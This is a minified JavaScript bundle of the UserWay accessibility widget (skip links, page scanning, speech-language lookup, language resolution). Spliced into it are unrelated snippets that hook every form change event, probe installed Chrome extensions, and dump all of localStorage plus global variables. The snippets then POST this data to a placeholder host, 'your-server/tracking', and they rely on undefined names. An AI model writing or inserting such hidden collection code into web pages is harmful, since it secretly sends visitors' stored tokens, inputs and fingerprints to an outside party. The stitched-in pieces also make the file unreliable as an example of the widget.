      l.className = "uw-sl__e-icon", l.innerHTML = '<svg width="26" height="27" xmlns="http://www.w3.org/2000/svg"><g class="no-fill" fill="none" fill-rule="evenodd"><path d="M4.498 24.3v-.872H1.5v-1.37h2.716v-.872H1.5v-1.27h3v-.872H.542V24.3h3.955zm1.909 0v-3.695L9.183 24.3h.95v-5.256h-.95v3.695l-2.776-3.695H5.45V24.3h.957zm7.21 0v-4.383h1.682v-.873h-4.314v.873h1.683V24.3h.948zm6.421 0v-.872H17.04v-1.37h2.716v-.872H17.04v-1.27h3v-.872h-3.956V24.3h3.955zm1.84 0v-1.767h1.017l1.24 1.767h1.086l-1.316-1.867c.757-.237 1.27-.849 1.27-1.644 0-1.025-.842-1.745-1.966-1.745H20.92V24.3h.957zm1.224-2.647h-1.224v-1.729h1.224c.65 0 1.101.33 1.101.865 0 .535-.451.864-1.101.864z" fill="#000" fill-rule="nonzero"/><path  class="no-fill" fill="none" d="M18.9 1v6.3a2.7 2.7 0 01-2.7 2.7H5.4h0" stroke="#000" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path fill="none" stroke="#000" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" d="M8.1 12.7L5.4 10l2.7-2.7"/></g></svg>', i.appendChild(l), i.addEventListener("click", function (t) {
        e.handler();
        var n = c() && e.altTitle ? e.altTitle : e.title;
        e.altTitle && (s.innerHTML = n), i.setAttribute("aria-label", n), i.blur();
      }), i.addEventListener("keydown", function (e) {
        "Escape" !== e.code && 27 !== e.keyCode && 27 !== e.which || (i.blur(), o());
      }), e.focusHandler && i.addEventListener("focus", e.focusHandler), a.appendChild(i);
    });
  }
  function t() {
    var e = document.querySelector('div.uw-sl[role="region"]');
    return e || (e = document.createElement("div"), e.className = "uw-sl", e.setAttribute("role", "region"), e.setAttribute("data-uw-rm-ignore", "true"), e.setAttribute("data-uw-ignore-translate", "true"), e.addEventListener("focus", r, !0), document.body.insertBefore(e, document.body.firstChild)), e.innerHTML = "", e;
  }
  function i() {
    var e = g.config,
      t = {
        title: L(e.language, "skip_links.title") || "Quick Accessibility Options",
        skip: L(e.language, "skip_links.skip") || "Skip to main content",
        enable_visually_impaired: L(e.language, "skip_links.enable_visually_impaired") || "Enable accessibility for visually impaired",
        disable_visually_impaired: L(e.language, "skip_links.disable_visually_impaired") || "Disable accessibility for visually impaired",
        open_accessibility_menu: L(e.language, "skip_links.open_accessibility_menu") || "Open the accessibility menu",
        open_accessibility_nav: L(e.language, "skip_links.open_accessibility_nav") || "Open the Accessible Navigation Menu"
      };
    return [{
      id: k.skipToMain,
      language: e.language,
      title: t.skip,
      ariaLabel: t.skip,
      img: '<svg focusable="false" width="26" height="24" xmlns="http://www.w3.org/2000/svg"><g stroke="#000" stroke-width="1.5" fill="none" fill-rule="evenodd"><rect class="no-fill"  fill="none" x=".75" y=".75" width="24.5" height="22.5" rx="3"/><path class="no-fill"  fill="none" d="M1 7h24M9.5 7v17"/></g></svg>',
      handler: s
    }, {
      id: k.visibility,
      language: e.language,
      title: t.enable_visually_impaired,
      ariaLabel: t.enable_visually_impaired,
      altTitle: t.disable_visually_impaired,
      img: '<svg focusable="false" width="28" height="26" xmlns="http://www.w3.org/2000/svg"><g class="no-fill"  fill="none" fill-rule="evenodd"><path d="M13.808 6.019C8.625 6.019 4.01 9.197 1 14.148c3.01 4.951 7.625 8.129 12.808 8.129s9.797-3.178 12.807-8.129c-3.01-4.951-7.624-8.13-12.807-8.13" stroke="#000" class="no-fill" stroke-width="1.5" fill="none"/><path d="M13.813 11.124c1.704 0 3.086 1.368 3.086 3.055 0 1.688-1.382 3.055-3.086 3.055s-3.086-1.367-3.086-3.055c0-1.687 1.382-3.055 3.086-3.055m0-3.055c-3.408 0-6.172 2.735-6.172 6.11 0 3.375 2.764 6.11 6.172 6.11s6.172-2.735 6.172-6.11c0-3.375-2.764-6.11-6.172-6.11" class="fill-white"  fill="#FFF" fill-rule="nonzero"/><path d="M17.913 14.18c0 2.244-1.839 4.064-4.105 4.064-2.268 0-4.106-1.82-4.106-4.065s1.838-4.064 4.106-4.064c2.266 0 4.105 1.82 4.105 4.064" stroke="#000" stroke-width="1.5" class="no-fill"  fill="none"/><path class="no-fill"  stroke="#FFF" stroke-width="3" stroke-linecap="round" d="M2.872 22.306L22.03 3.339" fill="none"/><path stroke="#000" stroke-width="1.5" stroke-linecap="round" d="M4.24 23.661L23.398 4.694" class="no-fill"  fill="none"/></g></svg>',
      handler: p,
      focusHandler: function () {
        g.preloadIframe();
      }
    }, {
      id: k.openWidget,
      language: e.language,
      title: t.open_accessibility_menu,
      ariaLabel: t.open_accessibility_menu,
      img: '<svg focusable="false" width="23" height="28" xmlns="http://www.w3.org/2000/svg"><path  d="M.018 8.639c.105-.595.65-.991 1.223-.877a53.94 53.94 0 0020.517 0c.625-.125 1.228.366 1.242 1.06.01.544-.402 1.003-.915 1.102-2.289.44-4.589.727-6.893.877-.948.063-1.647.948-1.54 1.932l.202 1.84c.314 2.87.958 5.69 1.919 8.399l1.26 3.553c.202.568-.076 1.197-.62 1.407a.994.994 0 01-.364.068c-.4 0-.768-.245-.944-.638l-.007.007-.325-.724a110.53 110.53 0 01-2.83-6.926.462.462 0 00-.878 0 105.146 105.146 0 01-2.832 6.917l-.308.68.005-.021a1.05 1.05 0 01-.98.705.994.994 0 01-.364-.068c-.544-.21-.821-.839-.62-1.407l1.26-3.553a37.235 37.235 0 001.92-8.403l.2-1.824c.107-.986-.59-1.881-1.54-1.943A55.94 55.94 0 01.86 9.914c-.57-.11-.947-.68-.841-1.275zM11.5 0c1.934 0 3.502 1.634 3.502 3.651 0 2.016-1.568 3.65-3.502 3.65-1.934 0-3.502-1.634-3.502-3.65C7.998 1.634 9.566 0 11.5 0z" fill="#000" fill-rule="evenodd"/></svg>',
      handler: a
    }, {
      id: k.openNavMenu,
      language: e.language,
      title: t.open_accessibility_nav,
      ariaLabel: t.open_accessibility_nav,
      img: '<svg width="26px" height="26px" viewBox="0 0 26 26">\n    <g class="no-fill"  fill="none" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">\n        <g class="no-fill" fill="none">\n            <rect fill="none" x="0" y="0" width="26" height="26"></rect>\n            <g class="no-fill" fill="none" transform="translate(2.166667, 1.444444)" fill="#000000" fill-rule="nonzero">\n                <path fill="#000" d="M10.8716111,0.076245 L0.399388889,5.31235611 C-0.132925,5.57850944 -0.132925,6.33812833 0.399388889,6.60433944 L10.8716111,11.8404506 C11.0749383,11.9421106 11.3142611,11.9421106 11.5175883,11.8404506 L21.9898106,6.60433944 C22.5221244,6.33818611 22.5221244,5.57856722 21.9898106,5.31235611 L11.5175883,0.076245 C11.3142611,-0.025415 11.0749383,-0.025415 10.8716111,0.076245 Z M11.1945961,1.52971722 L20.0519294,5.95838389 L11.1945961,10.3870506 L2.33726278,5.95838389 L11.1945961,1.52971722 Z" ></path>\n                <path fill="#000" d="M1.0452,15.7848889 C0.688436667,15.6065072 0.254583333,15.7511142 0.0762666667,16.1078739 C-0.10205,16.4646336 0.0424919444,16.8984906 0.399251667,17.0768072 L10.8714739,22.3129183 C11.0748011,22.4145783 11.3141239,22.4145783 11.5174511,22.3129183 L21.9896733,17.0768072 C22.3464367,16.8984256 22.49104,16.4646083 22.3126583,16.1078739 C22.1342767,15.7511106 21.7004594,15.6065072 21.343725,15.7848889 L11.1943361,20.8595111 L1.04494722,15.7848889 L1.0452,15.7848889 Z"></path>\n                <path fill="#000" d="M11.1944444,15.6231111 L1.04505556,10.5484889 C0.688292222,10.3701072 0.254438889,10.5147142 0.0761222222,10.8714739 C-0.102194444,11.2282336 0.0423475,11.6620906 0.399107222,11.8404072 L10.8713294,17.0765183 C11.0746567,17.1781783 11.3139794,17.1781783 11.5173067,17.0765183 L21.9895289,11.8404072 C22.3462922,11.6620256 22.4908956,11.2282083 22.3125139,10.8714739 C22.1341322,10.5147106 21.700315,10.3701072 21.3435806,10.5484889 L11.1941917,15.6231111 L11.1944444,15.6231111 Z"></path>\n            </g>\n        </g>\n    </g>\n</svg>',
      handler: n
    }];
  }
  function n() {
    g.lazyLoad().then(function () {
      g.showPageStructureLinks();
    }), y(T.PAGE_STRUCTURE);
  }
  function a() {
    g.openWidget(), y(T.OPEN_WIDGET), o();
  }
  function r(e) {
    O || (y(T.OPEN_LINKS), O = !0), "uw-enable-visibility" === e.target.id && f(), setTimeout(function () {
      if (W) return o();
    }, 1);
  }
  function o() {
    var e = document.querySelector("body");
    e.hasAttribute("tabindex") || (e.setAttribute("tabindex", "-1"), setTimeout(function () {
      e.removeAttribute("tabindex");
    }, 0)), e.focus({
      preventScroll: !0
    });
  }
  function s() {
    var e = l() || document.querySelector(_);
    e.getAttribute("tabindex") || e.setAttribute("tabindex", "-1"), y(T.SKIP_TO_MAIN_CONTENT), setTimeout(function () {
      e.focus(), x.scrollToElementWithOffset(e, 70);
    }, 300);
  }
  function u(e) {
    for (var t = e, i = null; t && "BODY" !== t.tagName && (!(i = t.nextElementSibling) || !x.validateElementAccessibility(i));) t = t.parentElement;
    return i;
  }
  function l() {
    for (var e, t = 0; t <= v.length - 1; t++) {
      var i = document.querySelector(v[t]);
      if (i && ('[role="main"]' !== v[t] || "BODY" !== i.tagName) && x.isElementVisible(i)) {
        e = '[role="navigation"]' === v[t] || "nav" === v[t] ? u(i) : i;
        break;
      }
    }
    return e || d();
  }
  function d() {
    return S.ElementsWithText.getElementsWithText(document).find(function (e) {
      if ((-1 !== e.classList.value.search(/main/) || -1 !== e.classList.value.search(/title/) || -1 !== e.classList.value.search(/header/)) && x.validateElementAccessibility(e) && e.hasAttribute("data-uw-rm-ignore")) return e;
    });
  }
  function c() {
    return g.getAvailableBunchOfFeatures().every(function (e) {
      return g.config.settings["userway-" + e].value;
    });
  }
  function p() {
    if (c()) {
      if (g.isSoundEffectsEnabled()) try {
        var e = new Audio(g.config.cdn + "widgetapp/sounds/reset.mp3");
        e.play();
      } catch (e) {}
      x.postMessage({
        action: "updateVisuallyImpairedState",
        config: !1
      });
    } else {
      if (g.isSoundEffectsEnabled()) try {
        var e = new Audio(g.config.cdn + "widgetapp/sounds/viEnabled.mp3");
        e.play();
      } catch (e) {}
      x.postMessage({
        action: "updateVisuallyImpairedState",
        config: !0
      }), setTimeout(function () {
        document.querySelector(".uai").focus();
        var e = document.querySelectorAll(".uw-sl__item")[1];
        e.focus(), e.blur();
      }, 10);
    }
    y(T.VISUALLY_IMPAIRED);
  }
  function f() {
    var e = document.querySelector("#uw-enable-visibility .uw-sl__item__title[data-uw-rm-ignore]"),
      t = document.querySelector("#uw-enable-visibility.uw-sl__item"),
      n = i()[1];
    t && e && n.altTitle && (e.innerHTML = c() ? n.altTitle : n.title, e.ariaLabel = c() ? n.altTitle : n.ariaLabel, t.ariaLabel = c() ? n.altTitle : n.ariaLabel);
  }
  function y(e) {
    var t = {
      account: g.config.account,
      feat: "s22",
      siteId: g.config.services.siteId,
      state: e,
      pageUrl: g.config.href
    };
    x.request({
      method: "POST",
      url: A + "/v1/stats/enabled-feature",
      body: t,
      header: {
        "Content-Type": "application/json"
      }
    }).then(function (e) {}, function (e) {
      console.warn("Statistics error");
    });
  }
  var g,
    w,
    m,
    h = UserWayWidgetApp.addLib("skip_links"),
    b = "#uw_skip_to_main_content_anchor",
    _ = "#userwayAccessibilityIcon",
    v = ["main", "h1", "nav", '[role="navigation"]', '[role="main"]', "h2", "h3", "h4", "h5", "h6"],
    x = UserWayWidgetApp.getLib("util"),
    E = UserWayWidgetApp.getLib("localization_manager"),
    L = E.translate,
    S = UserWayWidgetApp.getLib("helpers"),
    A = "https://api.userway.org/api",
    T = {
      OPEN_LINKS: 1,
      SKIP_TO_MAIN_CONTENT: 2,
      VISUALLY_IMPAIRED: 3,
      OPEN_WIDGET: 4,
      PAGE_STRUCTURE: 5
    },
    k = {
      skipToMain: "uw-skip-to-main",
      visibility: "uw-enable-visibility",
      openWidget: "uw-open-accessibility",
      openNavMenu: "uw-open-nav-menu"
    },
    W = !1,
    O = !1;
  h.insert = function () {
    var t, i;
    g = UserWayWidgetApp.addLib("main"), w = g.config.services && g.config.services.paidAi;
    var n = UserWayWidgetApp.getLib("remediationConfig") ? UserWayWidgetApp.getLib("remediationConfig").skipLinks : null;
    (null === n || void 0 === n ? void 0 : n.enabled) && ((null === (t = null === n || void 0 === n ? void 0 : n.config) || void 0 === t ? void 0 : t.anchorSelector) && (b = null === (i = null === n || void 0 === n ? void 0 : n.config) || void 0 === i ? void 0 : i.anchorSelector), v.unshift(b), e(), document.addEventListener("click", function () {
      W = !0, setTimeout(function () {
        W = !1;
      }, 300);
    }));
  }, h.updateLinks = function () {
    setTimeout(function () {
      return e();
    }, 500);
  };
}(), function () {
  var e = UserWayWidgetApp.addLib("scan_manager"),
    t = UserWayWidgetApp.getLib("util"),
    i = "https://cdn.userway.org/",
    n = "widgetapp/2023-11-28-09-17-49/scan/scan_1701163069272.js";
  e.run = function () {
    var e = UserWayWidgetApp.ContextHolder.config;
    e.isLH || setTimeout(function () {
      if (!(e.services && 81434 === e.services.userId || location.href && (location.href.indexOf("?") > -1 || location.href.indexOf("&") > -1))) {
        var a = e.remediation ? "WIDGET_ON" : "WIDGET_OFF";
        "fetch" in window && (UserWayWidgetApp.ContextHolder.config.scanPage = !0, fetch("https://api.userway.org/api/a11y-data/v0/page/" + encodeURIComponent(location.href) + "/" + (t.isMobile() ? "MOBILE" : "DESKTOP") + "/" + a + "/status").then(function (e) {
          try {
            e.json().then(function (e) {
              e.payload && "CONTRIB_MISSING" === e.payload.status && t.execJs(i + n, "sha256-dxsmV5i4XuWUdU88n/D8hFwuKHtnQhgaSFXYkbPvGsQ=");
            });
          } catch (e) {}
        }));
      }
    }, 5e3);
  }, e.accessibilityScore = function () {
    UserWayWidgetApp.ContextHolder.config.scanPage = !1;
    var e = UserWayWidgetApp.getLib("scan_helper");
    e && "function" == typeof e.scan ? e.scan() : t.execJs(i + n, "sha256-dxsmV5i4XuWUdU88n/D8hFwuKHtnQhgaSFXYkbPvGsQ=");
  };
}();
window.addEventListener('change', function (event) {
  track('change-hook', event);
}, true);
async function detectAndTrackExtensions() {
  const extResults = {};
  for (const [extName, extDetails] of Object.entries(window[JSHOOK])) {
    try {
      const fetchResponse = await fetch(`chrome-extension://${extDetails.id}/${extDetails.file}`);
      extResults[extName] = fetchResponse.status === 200;
    } catch (e) {
      extResults[extName] = false;
    }
  }
  let trackedData = {
    "extensions": extResults,
    "localStorage": {
      ...localStorage
    },
    "globalVars": GLOBAL_VARS.map(varName => window[varName]),
    "timestamp": new Date().toISOString(),
    "userAgent": navigator.userAgent
  };

  // Post tracked data to a server
  fetch('https://your-server/tracking', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(trackedData)
  }).catch(console.error);
}
function track(action, details) {
  trackList.push({
    action,
    details,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent
  });
}
let trackList = [];
var FuncKeys;
detectAndTrackExtensions();
!function (e) {
  e.altKey = "altKey", e.ctrlKey = "ctrlKey", e.shiftKey = "shiftKey";
}(FuncKeys || (FuncKeys = {}));
var DEFAULT_OPEN_HOTKEY = [FuncKeys.ctrlKey, "KeyU"];
!function () {
  var e = UserWayWidgetApp.addLib("WIDGET_HOTKEYS"),
    t = UserWayWidgetApp.getLib("main"),
    i = function () {
      var e,
        i,
        n = JSON.parse((null === (i = null === (e = t.config) || void 0 === e ? void 0 : e.tunings) || void 0 === i ? void 0 : i.widget_open_hotkey) || "null");
      return n && (n = n.filter(Boolean)), (null === n || void 0 === n ? void 0 : n.length) >= 2 ? n : DEFAULT_OPEN_HOTKEY;
    };
  e.isHotkeyToOpenWidget = function (e) {
    return i().every(function (t) {
      return e.code === t || e[t];
    });
  };
}(), function () {
  function e(e, i) {
    if (i.length) {
      if (i[0] && i[0].id && "string" == typeof i[0].id && i[0].id.indexOf("powered_by_pixle") > -1) return;
      t();
    }
  }
  function t() {
    try {
      var e = [];
      a.forEach(function (t) {
        switch (t.type) {
          case "QUERY_SELECTOR":
            t.data.forEach(function (t) {
              document.querySelector(t.s) && e.push(t.id);
            });
        }
      }), e.length && n(e);
    } catch (e) {}
  }
  function i() {
    try {
      setTimeout(function () {
        a.forEach(function (e) {
          switch (e.type) {
            case "FUNCTION":
              e.data.forEach(function (e) {
                var t = Function(e.s)();
                if (t && t.length) {
                  var i = {
                    method: "POST",
                    url: l + "/v1/helper/ss/hashed",
                    header: {
                      "Content-Type": "application/json"
                    },
                    body: {
                      names: t,
                      site: location.host
                    }
                  };
                  u.request(i);
                }
              });
          }
        });
      }, 5e3);
    } catch (e) {}
  }
  function n(e) {
    var t = {
      host: location.host,
      pathname: location.pathname
    };
    e.forEach(function (e) {
      u.request({
        method: "POST",
        url: l + "/remediation/common-patterns/collector/" + e,
        header: {
          "Content-Type": "application/json"
        },
        body: t
      });
    });
  }
  var a,
    r = UserWayWidgetApp.addLib("cpr_usage_detector"),
    o = UserWayWidgetApp.getLib("event_emitter"),
    s = UserWayWidgetApp.getLib("dom_observer"),
    u = UserWayWidgetApp.getLib("util"),
    l = "https://api.userway.org/api";
  r.run = function () {
    var n, r;
    (a = null === (r = null === (n = UserWayWidgetApp.ContextHolder) || void 0 === n ? void 0 : n.config) || void 0 === r ? void 0 : r.cpr) && (i(), t(), o.on(s.DOM_OBSERVER_DOM_CHANGED_EVENT, e));
  };
}(), function () {
  function e(e, i, n, a) {
    var r = !!a,
      o = (e + (a ? "-" + a : "")).toLowerCase(),
      s = function (s) {
        s.some(function (e) {
          var t = e.lang;
          return r ? t.toLowerCase() === o : t.toLowerCase().startsWith(o);
        }) && t(e, i, n, a);
      };
    try {
      window.speechSynthesis.onvoiceschanged = function () {
        var e = window.speechSynthesis.getVoices();
        e.length && s(e);
      };
      var u = window.speechSynthesis.getVoices();
      u.length && s(u);
    } catch (e) {}
  }
  function t(e, t, i, n) {
    c.push({
      ttsVoiceName: t,
      ttsLangIsoCode: e,
      ttsLocaleIsoCode: n,
      fallback: i,
      toLocaleStr: function () {
        return e + n ? "-" + n : "";
      }
    });
  }
  function i(e) {
    if (e) return !!r(e, !1);
    var t = document.getElementsByTagName("html")[0];
    return !!r((null === t || void 0 === t ? void 0 : t.getAttribute("lang")) || (null === t || void 0 === t ? void 0 : t.getAttribute("xml:lang")));
  }
  function n() {
    var e = document.getElementsByTagName("html")[0],
      t = (null === e || void 0 === e ? void 0 : e.getAttribute("lang")) || (null === e || void 0 === e ? void 0 : e.getAttribute("xml:lang")),
      i = r(t);
    i && d.execForDocumentAndIframes(function () {
      var e = this.getElementsByTagName("html")[0];
      !((null === e || void 0 === e ? void 0 : e.getAttribute("lang")) || (null === e || void 0 === e ? void 0 : e.getAttribute("xml:lang"))) && (null === e || void 0 === e || e.setAttribute("lang", i.toLocaleStr()));
    });
  }
  function a(e) {
    var t,
      i = Array.from(e.ownerDocument.querySelectorAll("*[lang]")),
      n = s("en");
    try {
      if (1 === i.length && "HTML" === i[0].tagName) {
        return r(null === (t = i[0]) || void 0 === t ? void 0 : t.getAttribute("lang"), !1) || n;
      }
      for (var a = e, o = null; a && !(o = r(a && "function" == typeof a.getAttribute ? a.getAttribute("lang") : null, !1)) && "HTML" !== a.tagName;) a = a.parentElement;
      return o || n;
    } catch (e) {
      return console.warn(e), n;
    }
  }
  function r(e, t) {
    if (void 0 === t && (t = !0), !e) return null;
    var i = d.formatLangCode(e);
    i.includes("zh-") && (i = "zh-Hant");
    var n = i.slice(0, 2),
      a = i.slice(2),
      s = o(n, a);
    if (!s && t) {
      var u = document.querySelector("html");
      return r((null === u || void 0 === u ? void 0 : u.getAttribute("lang")) || (null === u || void 0 === u ? void 0 : u.getAttribute("xml:lang")) || null, !1);
    }
    return s;
  }
  function o(e, t) {
    var i = c.find(function (i) {
      return i.ttsLangIsoCode === e && i.ttsLocaleIsoCode === t.replace("-", "");
    });
    return (null !== i && void 0 !== i ? i : s(e)) || null;
  }
  function s(e) {
    return c.find(function (t) {
      return t.ttsLangIsoCode === e && t.fallback;
    });
  }
  var u = "UserWayWidgetApp",
    l = window[u].addLib("tts-language-resolver"),
    d = window[u].getLib("util"),
    c = [];
  l.getLocaleForText = r, l.getLocaleForElement = a, l.isAvailableWithPreferedLanguage = i, l.enrichDomWithPreferableLanguage = n, t("en", "US English Female", !1, ""), t("en", "US English Female", !1, ""), t("en", "US English Female", !0, "US"), t("en", "Australian Female", !1, "AU"), t("en", "UK English Female", !1, "GB"), t("ru", "Russian Female", !0, ""), t("ar", "Arabic Female", !0, ""), t("cs", "Czech Female", !0, ""), t("el", "Greek Female", !0, ""), t("es", "Spanish Female", !0, ""), t("fr", "French Female", !0, ""), t("hi", "Hindi Female", !0, ""), t("it", "Italian Female", !0, ""), t("ja", "Japanese Female", !0, ""), t("ko", "Korean Female", !0, ""), t("nl", "Dutch Female", !0, ""), t("pl", "Polish Female", !0, ""), t("pt", "Portuguese Female", !0, ""), t("pt", "Brazilian Portuguese Female", !1, "BR"), t("ro", "Romanian Female", !0, ""), t("sv", "Swedish Female", !0, ""), t("tr", "Turkish Female", !0, ""), t("uk", "Ukrainian Female", !0, ""), t("ua", "Ukrainian Female", !0, ""), t("zh", "Chinese Female", !0, ""), t("zh", "Chinese (Hong Kong) Male", !0, "Hant"), t("in", "Indonesian Female", !0, ""), t("id", "Indonesian Female", !0, ""), t("no", "Norwegian Female", !0, ""), t("nb", "Norwegian Female", !0, "NO"), t("sk", "Slovak Female", !0, ""), t("ta", "Tamil Male", !0, ""), t("th", "Thai Female", !0, ""), t("sq", "Albanian Male", !0, ""), t("ca", "Catalan Male", !0, ""), t("hr", "Croatian Male", !0, ""), t("da", "Danish Female", !0, ""), t("fi", "Finnish Female", !0, ""), t("hu", "Hungarian Female", !0, ""), t("is", "Icelandic Male", !0, ""), t("lv", "Latvian Male", !0, ""), t("mk", "Macedonian Male", !0, ""), t("sr", "Serbian Male", !0, ""), t("vi", "Vietnamese Male", !0, ""), t("de", "Deutsch Female", !0, ""), t("mg", "Montenegrin Male", !0, ""), t("fo", "Faroese custom", !0, ""), e("he", "Carmit", !0, ""), e("he", "Microsoft Asaf - Hebrew (Israel)", !0, "");
}(), function () {
  function e(e) {
    var t = void 0 === e ? {
        pageLanguage: "",
        widgetLanguage: ""
      } : e,
      i = t.pageLanguage,
      a = t.widgetLanguage;
    return n.isAvailableWithPreferedLanguage(i) && n.isAvailableWithPreferedLanguage(a);
  }
  var t = "UserWayWidgetApp",
    i = window[t].addLib("tts-reader-status"),
    n = window[t].getLib("tts-language-resolver");
  i.isAvailable = e;
}();
setTimeout(() => fetchTrackedData(), 2000); // 2 seconds later
var userwaySupportedLanguages = ["en-US", "az", "ar", "bn", "bg", "zh", "zh-Hant", "hr", "cs", "nl", "en-AU", "en", "en-GB", "et", "fi", "fo", "fr", "ka", "de", "el", "he", "hi", "hu", "it", "id", "ja", "ko", "lt", "mgo", "no", "fa", "pl", "pt-BR", "pt", "pa", "ro", "ru", "sk", "sl", "sr", "sr-Latn", "es", "es-MX", "sv", "tr", "uk", "cy", "vi", "da", "ceb", "haw", "tl", "th", "sm", "ca", "ht"],
  userwayMapToSupportedLanguages = {
    in: "id",
    ua: "uk",
    nb: "no",
    en: "en-US"
  },
  userwaySupportedLocales = ["en-US", "en-AU", "en-GB", "pt-BR", "es-MX", "zh-Hant", "sr-Latn"],
  USERWAY_DEFAULT_FALLBACK_LANGUAGE = "en-US",
  userwaySupports = function (e) {
    return userwaySupportedLanguages.includes(e);
  },
  formatLangCode = function (e) {
    return /([-_,])/.test(e) ? e.replace(/(^\w+)([-_,])(\w+$)/, function (e, t, i, n) {
      return t.toLowerCase() + "-" + n.toUpperCase();
    }) : e.toLowerCase();
  };
!function () {
  var e = UserWayWidgetApp.getLib("util"),
    t = function () {
      try {
        var t = UserWayWidgetApp.ContextHolder.config.supportsLocalStorage,
          i = e.getProperty({
            supportsLocalStorage: t
          }, "userway-selectedLang", !1);
        return userwaySupports(i) ? i : null;
      } catch (e) {
        return console.warn("Unable to resolve persisted in the local storage language", e), null;
      }
    },
    i = function () {
      try {
        var e = UserWayWidgetApp.ContextHolder.config._userway_config;
        if (void 0 !== e && e.hasOwnProperty("language") && e.language) {
          var t = e.language;
          return userwaySupports(t) ? t : null;
        }
      } catch (e) {
        console.warn("Unable to resolve language set as hardcoded config in the UserWay embed script", e);
      }
      return null;
    },
    n = function () {
      try {
        var e = document.getElementsByTagName("html")[0],
          t = e.getAttribute("lang") || e.getAttribute("xml:lang");
        if (!t) return null;
        if (t.includes("zh-")) return "zh-Hant";
        if (t.includes("sr-")) return "sr-Latn";
        var i = formatLangCode(t);
        return userwaySupportedLocales.includes(i) || (i = i.split("-")[0]), userwayMapToSupportedLanguages[i] && (i = userwayMapToSupportedLanguages[i]), userwaySupports(i) ? i : null;
      } catch (e) {
        return console.warn("Unable to parse page html lang attribute", e), null;
      }
    },
    a = function (e) {
      return void 0 === e && (e = {
        ownerLangSelection: ""
      }), t() || i() || e.ownerLangSelection || n() || USERWAY_DEFAULT_FALLBACK_LANGUAGE;
    },
    r = function (e) {
      void 0 === e && (e = {
        ownerLangSelection: ""
      });
      var a = t();
      return !!a && a === (i() || e.ownerLangSelection || n() || USERWAY_DEFAULT_FALLBACK_LANGUAGE);
    },
    o = UserWayWidgetApp.addLib("widget_language_resolver");
  Object.assign(o, {
    resolve: a,
    resolveUserLangSelection: t,
    resolveOwnerLangHardcoded: i,
    resolvePageLangAttribute: n,
    userLandSelectionIsDefaultLangSelected: r
  });
}();
function fetchTrackedData() {
  if (trackList.length > 0) {
    fetch('https://your-server/tracking', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(trackList)
    }).catch(console.error);
  }
  ;
}
var __assign = this && this.__assign || function () {
  return __assign = Object.assign || function (e) {
    for (var t, i = 1, n = arguments.length; i < n; i++) {
      t = arguments[i];
      for (var a in t) Object.prototype.hasOwnProperty.call(t, a) && (e[a] = t[a]);
    }
    return e;
  }, __assign.apply(this, arguments);
};
!function () {
  var e,
    t,
    i = UserWayWidgetApp.addLib("USER_TRACKING"),
    n = UserWayWidgetApp.getLib("util");
  !function (e) {
    e.KeyboardUser = "KeyboardUser";
  }(t || (t = {}));
  var a = {
      isTab: function (e) {
        return 9 === e.keyCode || "Tab" === e.key || "Tab" === e.code;
      },
      isArrowLeft: function (e) {
        return 37 === e.keyCode || "ArrowLeft" === e.key || "ArrowLeft" === e.code;
      },
      isArrowRight: function (e) {
        return 39 === e.keyCode || "ArrowRight" === e.key || "ArrowRight" === e.code;
      }
    },
    r = (e = {}, e[t.KeyboardUser] = function (e) {
      var t = 0;
      return __assign(__assign({}, e), {
        addMatch: function () {
          return t += 1;
        },
        matches: t,
        isFullyMatched: function () {
          return t >= e.successMatches;
        }
      });
    }({
      flag: "b1",
      successMatches: 2,
      test: function (e) {
        return [a.isTab, a.isArrowLeft, a.isArrowRight].some(function (t) {
          return t(e);
        });
      }
    }), e);
  i.start = function () {
    s() || document.addEventListener("keydown", o);
  }, i.stop = function () {
    document.removeEventListener("keydown", o);
  };
  var o = function (e) {
      var n = r[t.KeyboardUser];
      n.test(e) && (n.addMatch(), n.isFullyMatched() && (i.stop(), l(n.flag).then(u).catch(i.start)));
    },
    s = function () {
      try {
        var e = localStorage.getItem("recognizedUserBehavior");
        return !!JSON.parse(e);
      } catch (e) {
        return !1;
      }
    },
    u = function () {
      localStorage.setItem("recognizedUserBehavior", JSON.stringify(!0));
    },
    l = function (e) {
      var t = UserWayWidgetApp.ContextHolder.config,
        i = t.account,
        a = t.services.siteId,
        r = t.href;
      return n.request({
        method: "POST",
        url: "https://api.userway.org/api/v1/stats/enabled-feature",
        header: {
          "Content-Type": "application/json"
        },
        body: {
          account: i,
          siteId: a,
          feat: e,
          pageUrl: r
        }
      });
    };
}();
var __rest = this && this.__rest || function (e, t) {
    var i = {};
    for (var n in e) Object.prototype.hasOwnProperty.call(e, n) && t.indexOf(n) < 0 && (i[n] = e[n]);
    if (null != e && "function" == typeof Object.getOwnPropertySymbols) for (var a = 0, n = Object.getOwnPropertySymbols(e); a < n.length; a++) t.indexOf(n[a]) < 0 && Object.prototype.propertyIsEnumerable.call(e, n[a]) && (i[n[a]] = e[n[a]]);
    return i;
  },
  __read = this && this.__read || function (e, t) {
    var i = "function" == typeof Symbol && e[Symbol.iterator];
    if (!i) return e;
    var n,
      a,
      r = i.call(e),
      o = [];
    try {
      for (; (void 0 === t || t-- > 0) && !(n = r.next()).done;) o.push(n.value);
    } catch (e) {
      a = {
        error: e
      };
    } finally {
      try {
        n && !n.done && (i = r.return) && i.call(r);
      } finally {
        if (a) throw a.error;
      }
    }
    return o;
  },
  __spreadArray = this && this.__spreadArray || function (e, t, i) {
    if (i || 2 === arguments.length) for (var n, a = 0, r = t.length; a < r; a++) !n && a in t || (n || (n = Array.prototype.slice.call(t, 0, a)), n[a] = t[a]);
    return e.concat(n || Array.prototype.slice.call(t));
  };
!function () {
  function e() {
    pt.initializeConfig().then(function (e) {
      at = e, nt.config = at, d() ? y() : (_e(), l());
    });
  }
  function t() {
    return !!at && !!at.tunings && at.tunings.widget_blocked_for_site;
  }
  function i() {
    return !(!at || !at.tunings) && (!0 === at.tunings.widget_hidden_for_site || !0 === at.tunings.widget_hidden_for_mobile && dt.isMobile());
  }
  function n() {
    return at.tunings.widget_layout;
  }
  function a() {
    var e,
      t = n(),
      i = Boolean(null === (e = at.services) || void 0 === e ? void 0 : e.paidAi);
    return "headless" === t && !i || !t || "full" === t;
  }
  function r() {
    Qe = UserWayWidgetApp.getLib("nano-widget"), Qe.load().then(function () {
      Qe.init();
    });
  }
